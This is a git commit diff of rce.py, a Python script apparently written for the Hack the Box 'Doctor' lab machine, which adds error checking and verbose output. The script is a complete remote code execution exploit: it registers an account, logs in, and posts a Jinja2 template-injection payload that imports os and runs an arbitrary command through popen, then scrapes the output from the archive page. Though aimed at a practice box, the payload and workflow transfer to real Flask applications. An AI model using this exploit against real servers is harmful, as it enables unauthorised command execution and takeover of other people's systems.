ccec0a20b21a846cabe3a734ea7d18e67815dca1
0xfinlay <finlay.richardson1@gmail.com>
2020-09-30 17:18:25 -0400

    Add error checking

--- rce.py
+++ rce.py
@@ -1,49 +1,107 @@
-import requests, re, argparse
-
-proxies = {
-    "http" : "http://127.0.0.1:8080"
-}
+import requests, re, argparse, random
 
 # Parsing the commmand from the user
-parser = argparse.ArgumentParser(prog='rce.py',
-    description='Hack the Box Doctor RCE to get foothold',
-    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
-parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,
-    dest='command', help='command')
+parser = argparse.ArgumentParser(description = 'Hack the Box Doctor RCE')
+parser.add_argument('-c', '--command', metavar = '<COMMAND>', type = str, required = True, help = "Command you want to be executed. eg. python rce.py -c 'whoami'")
+parser.add_argument('-v', '--verbose', help = 'Increase output verbosity', action = 'store_true')
 args = parser.parse_args()
 
 def make_account(): # Creates account with a@a.a as email and a as password
+    if args.verbose: # Feel free to ignore these lines, they just print info in verbose mode
+        print("[\033[94m*\033[0m] Creating account with email: a@a.a and password: a") # These are ANSI escape characters which colour the characters on your terminal.
     url = "http://doctors.htb/register"
     data = {'username' : 'aa', 'email' : 'a@a.a', 'password' : 'a', 'confirm_password' : 'a', 'submit' : 'Sign Up'}
-    request = requests.post(url, data = data, proxies = proxies)
+    try:
+        requests.post(url, data = data)
+    except:
+        print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
+        exit()
+    if args.verbose:
+        print("[\033[92m+\033[0m] Account created")
 
-def get_cookie(): # Get's the cookie so we can post our message
+def get_cookie(): # Gets the cookie so we can post our message
+    if args.verbose:
+        print("[\033[94m*\033[0m] Getting login cookie")
     url = "http://doctors.htb/login"
     data = {'email' : 'a@a.a', 'password' : 'a', 'submit' : 'Login'}
     session = requests.Session()
-    request = session.post(url, data = data, proxies = proxies)
-    cookie = session.cookies.get_dict()
+    try:
+        session.post(url, data = data)
+        cookie = session.cookies.get_dict()
+    except:
+        print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
+        exit()
+    if args.verbose:
+        print("[\033[92m+\033[0m] Cookie retrieved")
     return cookie
 
 def send_payload(cookie, command): # Sends the command payload as the message title
+    if args.verbose:
+        print("[\033[94m*\033[0m] Sending payload")
+    message_id = "a" + str(random.randint(0, 10000)) # I created a message id in case the command gives an error, the only way to fix the error and allow you to enter more commands is to delete the message. The message id was my method of finding the message with the invalid command and deleting it.
     url = 'http://doctors.htb/post/new'
     payload = "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('" + command + "')|attr('read')()}}"
-    data = {'title' : payload, 'content' : 'a', 'submit' : 'Post'}
-    request = requests.post(url, cookies = cookie, data = data, proxies = proxies)
+    data = {'title' : payload, 'content' : message_id, 'submit' : 'Post'}
+    try:
+        requests.post(url, cookies = cookie, data = data)
+    except:
+        print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
+        exit()
+    if args.verbose:
+        print("[\033[92m+\033[0m] Payload sent")
+    return message_id
     
-def read_output(cookie): # Reads the output from the most recent command
+def read_output(cookie, message_id): # Reads the output from the most recent command
+    if args.verbose:
+        print("[\033[94m*\033[0m] Getting output from /archives")
     url = "http://doctors.htb/archive"
-    response = requests.get(url, cookies = cookie, proxies = proxies)
+    try:
+        response = requests.get(url, cookies = cookie)
+    except:
+        print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
+        exit()
+    if response.status_code == 500:
+        print("[\033[91m-\033[0m] Invalid command, deleting message...")
+        delete_message(cookie, message_id)
+        exit()
     html = response.text
-    outputs = re.findall(r'<title>\s*([\s\S]+?)\s*</title>', html)
-    output = outputs[-1]
+    outputs = re.findall(r'<title>\s*([\s\S]+?)\s*</title>', html) # Finds all outputs in the page source
+    output = outputs[-1] # Shows the most recent output (relevant to the most recent command)
+    if args.verbose:
+        print("[\033[92m+\033[0m] Output retrieved\n")
     return output
 
+def delete_message(cookie, message_id):
+    if args.verbose:
+        print("[\033[36m*\033[0m] Deleting most recent message")
+    counter = 0
+    deleted = False
+    while not(deleted):
+        url = f'http://doctors.htb/post/{counter}'
+        try:
+            response = requests.get(url, cookies = cookie)
+        except:
+            print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
+            exit()
+        if response.status_code != 404:
+            html = response.text
+            message = re.findall(r'<p class="article-content">\s*([\s\S]+?)\s*</p>', html)
+            if str(message[0]) == message_id:
+                url += '/delete'
+                try:
+                    requests.post(url, cookies = cookie)
+                except:
+                    print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
+                    exit()
+                deleted = True
+        counter += 1    
+    print("[\033[92m+\033[0m] Message deleted, re-run again with valid command")
 
+    
 ############## Main ################
 make_account()
 cookie = get_cookie()
 command = args.command
-send_payload(cookie, command)
-output = read_output(cookie)
+message_id = send_payload(cookie, command)
+output = read_output(cookie, message_id)
 print(output)
